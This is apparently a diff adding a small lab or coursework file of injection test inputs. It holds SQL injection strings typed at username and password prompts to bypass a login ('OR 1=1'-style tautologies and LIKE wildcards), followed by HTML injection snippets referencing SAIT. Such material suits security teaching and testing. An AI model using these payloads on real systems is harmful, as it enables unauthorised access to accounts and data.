@@ -1,0 +1,21 @@
+Enter username:
+adam
+Enter password:
+' OR '1' = '1
+--------------------------------
+Enter username:
+' or 'joseph' ='joseph
+Enter password:
+' or 'pass' ='pass
+--------------------------------
+Enter username:
+' or username like '%B%
+Enter password:
+' or password like '%B%
+--------------------------------
+
+
+<h1> Boom! </h1>
+<h2> Boom! </h2>
+<a href="https://sait.ca"> <h2>SAIT</h2></a>
+<img src="https://www.sait.ca/images/saitlogo.svg">
